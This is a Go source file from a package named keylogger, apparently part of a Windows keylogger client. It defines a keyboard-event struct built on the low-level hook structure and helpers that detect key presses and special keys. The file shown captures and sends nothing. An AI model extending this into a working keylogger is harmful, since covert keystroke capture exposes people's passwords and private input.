package keylogger

import (
	"unsafe"

	"github.com/Spriithy/gkl/client/windows"
)

type KeyboardEvent struct {
	WParam     windows.WPARAM
	LParam     windows.LPARAM
	Layout     windows.HKL
	HookStruct *windows.KBDLLHOOKSTRUCT
}

func newKeyboardEvent(wParam windows.WPARAM, lParam windows.LPARAM, layout windows.HKL) *KeyboardEvent {
	return &KeyboardEvent{
		WParam:     wParam,
		LParam:     lParam,
		Layout:     layout,
		HookStruct: (*windows.KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam)),
	}
}

func (ke *KeyboardEvent) isUp() bool {
	return ke.isKeyUp() || ke.isSysKeyUp()
}

func (ke *KeyboardEvent) isDown() bool {
	return ke.isKeyDown() || ke.isSysKeyDown()
}

func (ke *KeyboardEvent) isKeyUp() bool {
	return ke.WParam == windows.WM_KEYUP
}

func (ke *KeyboardEvent) isKeyDown() bool {
	return ke.WParam == windows.WM_KEYDOWN
}

func (ke *KeyboardEvent) isSysKeyUp() bool {
	return ke.WParam == windows.WM_SYSKEYUP
}

func (ke *KeyboardEvent) isSysKeyDown() bool {
	return ke.WParam == windows.WM_SYSKEYDOWN
}

func (ke *KeyboardEvent) isMode(mode windows.WPARAM) bool {
	return ke.WParam == mode
}

func (ke *KeyboardEvent) isVk(vkCode windows.DWORD) bool {
	return ke.HookStruct.VkCode == vkCode
}

func (ke *KeyboardEvent) isVkMode(vkCode windows.DWORD, mode windows.WPARAM) bool {
	return ke.isMode(mode) && ke.isVk(vkCode)
}

func (ke *KeyboardEvent) isShift() bool {
	return ke.isVk(windows.VK_SHIFT) || ke.isVk(windows.VK_LSHIFT) || ke.isVk(windows.VK_RSHIFT)
}

func (ke *KeyboardEvent) isCaps() bool {
	return ke.isVk(windows.VK_CAPITAL)
}

func (ke *KeyboardEvent) isReturn() bool {
	return ke.isVk(windows.VK_RETURN)
}

func (ke *KeyboardEvent) isBackspace() bool {
	return ke.isVk(windows.VK_BACK)
}

func (ke *KeyboardEvent) isControl() bool {
	return ke.isVk(windows.VK_CONTROL) || ke.isVk(windows.VK_LCONTROL) || ke.isVk(windows.VK_RCONTROL)
}

func (ke *KeyboardEvent) isMenu() bool {
	return ke.isVk(windows.VK_MENU) || ke.isVk(windows.VK_LMENU) || ke.isVk(windows.VK_RMENU)
}

func (ke *KeyboardEvent) isEscape() bool {
	return ke.isVk(windows.VK_ESCAPE)
}

func (ke *KeyboardEvent) isTab() bool {
	return ke.isVk(windows.VK_TAB)
}

func (ke *KeyboardEvent) isNumLock() bool {
	return ke.isVk(windows.VK_NUMLOCK)
}
